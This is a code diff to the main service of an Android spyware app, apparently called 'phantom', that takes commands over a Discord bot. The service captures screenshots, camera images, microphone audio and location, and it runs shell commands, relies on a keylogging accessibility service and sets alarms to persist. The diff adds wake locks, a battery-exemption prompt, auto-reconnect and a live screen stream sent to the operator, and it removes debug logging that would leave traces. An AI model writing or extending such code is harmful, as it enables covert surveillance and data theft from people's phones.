@@ -5,6 +5,7 @@ import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
 import android.app.Service
+import android.content.BroadcastReceiver
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
@@ -24,18 +25,23 @@ import android.location.LocationListener
 import android.location.LocationManager
 import android.media.ImageReader
 import android.media.MediaRecorder
+import android.net.ConnectivityManager
+import android.net.Network
+import android.net.NetworkCapabilities
+import android.net.NetworkRequest
 import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
+import android.os.PowerManager
 import android.os.VibrationEffect
 import android.os.Vibrator
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Settings
-import android.util.Log
+
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.google.system.DiscordGatewayClient
@@ -47,9 +53,9 @@ import java.util.concurrent.TimeUnit
 
 class MainService : Service() {
     companion object {
-        private const val TAG = "MainService"
         private const val NOTIF_ID = 1337
         private const val CHANNEL = "phantom"
+        private const val WAKELOCK_TAG = "phantom:wakelock"
 
         fun start(ctx: Context) {
             try {
@@ -58,29 +64,29 @@ class MainService : Service() {
                     ctx.startForegroundService(i)
                 else
                     ctx.startService(i)
-            } catch (e: Exception) {
-                Log.e(TAG, "start: ${e.message}")
-            }
+            } catch (_: Exception) {}
         }
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var discord: DiscordGatewayClient? = null
     private var gatewayStarted = false
-    private var debugFile: File? = null
-    private val debugLock = Any()
-    private fun appendDebug(text: String) = synchronized(debugLock) { debugFile?.appendText(text) }
+    private var wakeLock: PowerManager.WakeLock? = null
+    private var networkCallback: ConnectivityManager.NetworkCallback? = null
+    private var streamJob: Job? = null
+    private var isStreaming = false
+    private var streamFps = 1
 
     override fun onBind(i: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         try {
-            debugFile = File(filesDir, "phantom_debug.txt")
-            debugFile?.writeText("${System.currentTimeMillis()} service onCreate\n")
-            debugFile?.appendText("pkg=${packageName} uid=${android.os.Process.myUid()}\n")
-            debugFile?.appendText("model=${Build.MODEL} sdk=${Build.VERSION.SDK_INT}\n")
-            debugFile?.appendText("debug path: ${filesDir.absolutePath}\n")
+            
+            
+            
+            
+            
             val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_LOW).apply {
                 setSound(null, null)
                 setShowBadge(false)
@@ -94,40 +100,72 @@ class MainService : Service() {
                 startForeground(NOTIF_ID, buildNotif("Starting..."))
             }
         } catch (e: Exception) {
-            Log.e(TAG, "fg: ${e.message}")
+            
         }
+
+        // Acquire wake lock to keep CPU alive
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, WAKELOCK_TAG)
+            if (!wakeLock!!.isHeld) {
+                wakeLock!!.acquire(24 * 60 * 60 * 1000L)
+                
+            }
+        } catch (e: Exception) {
+            
+        }
+
+        // Request battery optimization exemption
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                    intent.data = Uri.parse("package:$packageName")
+                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    startActivitySafely(intent)
+                    
+                }
+            }
+        } catch (e: Exception) {
+            
+        }
+
+        // Register network callback for auto-reconnect
+        registerNetworkCallback()
+
         // Auto-open accessibility if not enabled
         if (!KeylogService.isRunning) {
-            Log.w(TAG, "Accessibility not running — opening settings")
+            
             try {
                 val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 startActivitySafely(intent)
             } catch (e: Exception) {
-                Log.e(TAG, "open accessibility: ${e.message}")
+                
             }
         }
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        debugFile?.appendText("${System.currentTimeMillis()} onStartCommand flags=$flags startId=$startId gatewayStarted=$gatewayStarted discord=${discord != null}\n")
+        
         if (discord == null) {
-            debugFile?.appendText("onStartCommand: creating DiscordGatewayClient\n")
+            
             discord = DiscordGatewayClient(
                 onCommand = { action, payload ->
                     scope.launch { handleGatewayCommand(action, payload) }
                 },
                 onStatus = { s -> updateNotif(s) }
             )
-            debugFile?.let { discord?.setDebugFile(it) }
-            debugFile?.let { KeylogService.setLogFile(it) }
+            
+            
         }
         if (!gatewayStarted) {
             gatewayStarted = true
             scope.launch { loadCrashReports() }
-            debugFile?.appendText("onStartCommand: calling discord.start()\n")
+            
             discord?.start(scope)
-            debugFile?.appendText("onStartCommand: discord.start() returned\n")
+            
         }
         return START_STICKY
     }
@@ -150,7 +188,6 @@ class MainService : Service() {
 
     private fun updateNotif(text: String) {
         showNotif(text)
-        appendDebug("${System.currentTimeMillis()} status=$text\n")
     }
 
     private fun startActivitySafely(intent: Intent) {
@@ -163,7 +200,7 @@ class MainService : Service() {
                 startActivity(intent)
             }
         } catch (e: Exception) {
-            Log.e(TAG, "startActivitySafely: ${e.message}")
+            
         }
     }
 
@@ -179,9 +216,9 @@ class MainService : Service() {
             val report = files.first().readText()
             files.forEach { it.delete() }
             discord?.setCrashReport(report)
-            Log.i(TAG, "Loaded crash report: ${files.first().name}, deleted ${files.size - 1} old reports")
+            
         } catch (e: Exception) {
-            Log.e(TAG, "loadCrashReports: ${e.message}")
+            
         }
     }
 
@@ -191,7 +228,7 @@ class MainService : Service() {
 
     private suspend fun handleGatewayCommand(action: String, payload: String?) {
         val d = discord ?: return
-        Log.i(TAG, "cmd: $action payload: ${payload?.take(50)}")
+        
         try {
             when (action) {
                 "help" -> {
@@ -231,7 +268,45 @@ class MainService : Service() {
                     } else {
                         val err = ":x: **Screenshot failed** (${elapsed}ms)\n`!debug` for details"
                         if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
-                        Log.w(TAG, "screenshot failed after ${elapsed}ms")
+                        
+                    }
+                }
+                "stream" -> {
+                    when (payload?.lowercase()) {
+                        "stop" -> {
+                            if (isStreaming) {
+                                streamJob?.cancel()
+                                isStreaming = false
+                                d.sendMsg(":stop_button: **Live stream stopped**")
+                            } else {
+                                d.sendMsg(":x: No active stream")
+                            }
+                        }
+                        null, "" -> {
+                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nUsage: `!stream start` (1fps)\nUsage: `!stream 2` (2fps, max 5)\nUsage: `!stream stop`")
+                        }
+                        else -> {
+                            val fps = payload.toIntOrNull()
+                            if (fps != null && fps in 1..5) {
+                                streamFps = fps
+                                if (isStreaming) {
+                                    streamJob?.cancel()
+                                }
+                                isStreaming = true
+                                d.sendMsg(":tv: **Live stream started** at ${fps}fps\nUse `!stream stop` to end")
+                                streamJob = scope.launch {
+                                    while (isActive) {
+                                        val bytes = captureScreen()
+                                        if (bytes != null) {
+                                            d.sendFile("", "stream_${System.currentTimeMillis()}.jpg", bytes)
+                                        }
+                                        delay(1000L / fps)
+                                    }
+                                }
+                            } else {
+                                d.sendMsg(":x: Invalid FPS. Use 1-5. Usage: `!stream <1-5>`")
+                            }
+                        }
                     }
                 }
                 "shell" -> {
@@ -290,7 +365,7 @@ class MainService : Service() {
                             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                             startActivitySafely(intent)
                         } catch (e: Exception) {
-                            Log.e(TAG, "open notif settings: ${e.message}")
+                            
                         }
                         return
                     }
@@ -414,15 +489,12 @@ class MainService : Service() {
                     d.sendMsg(":bar_chart: **Status**\n```ansi\n$statusMsg\n```")
                 }
                 "debug" -> {
-                    val f = debugFile
-                    if (f != null && f.exists() && f.length() > 0) {
-                        val lines = f.readLines()
-                        val total = lines.size
-                        val last = lines.takeLast(40).joinToString("\n")
-                        d.sendMsg(":mag: **Debug Log** (last 40 of $total lines)\n```\n${last.take(1900)}\n```")
-                    } else {
-                        d.sendMsg(":mag: Debug file empty or null")
-                    }
+                    val uptime = discord?.getUptime() ?: 0L
+                    val hrs = uptime / 3600000
+                    val mins = (uptime % 3600000) / 60000
+                    val secs = (uptime % 60000) / 1000
+                    val conn = discord?.isConnected() == true
+                    d.sendMsg(":mag: **Debug Info**\nUptime: ${hrs}h ${mins}m ${secs}s\nConnected: $conn\nSDK: ${Build.VERSION.SDK_INT}\nModel: ${Build.MODEL}")
                 }
                 "restart" -> {
                     d.sendMsg(":arrows_counterclockwise: Restarting gateway...")
@@ -734,7 +806,7 @@ class MainService : Service() {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "gateway cmd: ${e.message}")
+            
             d.sendMsg(":x: **Error**: ${e.message?.take(100)}")
         }
     }
@@ -772,8 +844,6 @@ class MainService : Service() {
         ss.capture(object : ScreenshotModule.Callback {
             override fun onSuccess(data: ByteArray) { deferred.complete(data) }
             override fun onFailure(error: String) {
-                appendDebug("captureScreen: $error\n")
-                Log.w(TAG, "captureScreen: $error")
                 deferred.complete(null)
             }
         })
@@ -872,7 +942,7 @@ class MainService : Service() {
             latch.await(15, TimeUnit.SECONDS)
             result
         } catch (e: Exception) {
-            Log.e(TAG, "camera legacy: ${e.message}")
+            
             null
         } finally {
             try {
@@ -900,7 +970,7 @@ class MainService : Service() {
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "camera2 find: ${e.message}")
+            
             null
         }
 
@@ -938,7 +1008,7 @@ class MainService : Service() {
                                 try {
                                     s.capture(captureRequest, null, handler)
                                 } catch (e: Exception) {
-                                    Log.e(TAG, "camera2 capture: ${e.message}")
+                                    
                                     deferred.complete(null)
                                 }
                             }
@@ -947,7 +1017,7 @@ class MainService : Service() {
                             }
                         }, handler)
                     } catch (e: Exception) {
-                        Log.e(TAG, "camera2 session: ${e.message}")
+                        
                         deferred.complete(null)
                     }
                 }
@@ -968,14 +1038,14 @@ class MainService : Service() {
                         deferred.complete(bytes)
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "camera2 read: ${e.message}")
+                    
                     deferred.complete(null)
                 }
             }, handler)
 
             withTimeoutOrNull(15000L) { deferred.await() }
         } catch (e: Exception) {
-            Log.e(TAG, "camera2: ${e.message}")
+            
             null
         } finally {
             try { session?.close() } catch (_: Exception) {}
@@ -1073,7 +1143,7 @@ class MainService : Service() {
                 return ":round_pushpin: **Location** (IP-based)\nLat: `$lat`\nLon: `$lon`\nCity: $city, $country\nIP: $ip\nhttps://www.google.com/maps?q=$lat,$lon"
             }
         } catch (e: Exception) {
-            Log.w(TAG, "ipLocation: ${e.message}")
+            
         }
         return ":x: No location available — ensure GPS/WiFi is on and try outside"
     }
@@ -1155,7 +1225,7 @@ class MainService : Service() {
             recorder = null
             if (file.exists() && file.length() > 0) file else null
         } catch (e: Exception) {
-            Log.e(TAG, "mic: ${e.message}")
+            
             null
         } finally {
             try { recorder?.release() } catch (_: Exception) {}
@@ -1290,14 +1360,75 @@ class MainService : Service() {
             val pi = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
             val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
             am.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, 600000, pi)
-            Log.i(TAG, "Persist: ${dst.absolutePath} + alarm set")
+            
         } catch (e: Exception) {
-            Log.e(TAG, "persist: ${e.message}")
+            
             throw e
         }
     }
 
+    private fun registerNetworkCallback() {
+        try {
+            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            networkCallback = object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    super.onAvailable(network)
+                    
+                    
+                    // Trigger reconnect if Discord is connected
+                    discord?.let {
+                        if (!it.isConnected()) {
+                            scope.launch {
+                                delay(2000)
+                                it.start(scope)
+                            }
+                        }
+                    }
+                }
+
+                override fun onLost(network: Network) {
+                    super.onLost(network)
+                    
+                    
+                }
+
+                override fun onUnavailable() {
+                    super.onUnavailable()
+                    
+                    
+                }
+            }
+            val request = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+            cm.registerNetworkCallback(request, networkCallback!!)
+            
+        } catch (e: Exception) {
+            
+        }
+    }
+
     override fun onDestroy() {
+        // Release wake lock
+        try {
+            if (wakeLock?.isHeld == true) {
+                wakeLock?.release()
+                
+            }
+        } catch (e: Exception) {
+            
+        }
+
+        // Unregister network callback
+        try {
+            networkCallback?.let {
+                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+                cm.unregisterNetworkCallback(it)
+            }
+        } catch (e: Exception) {
+            
+        }
+
         discord?.stop()
         discord = null
         scope.cancel()
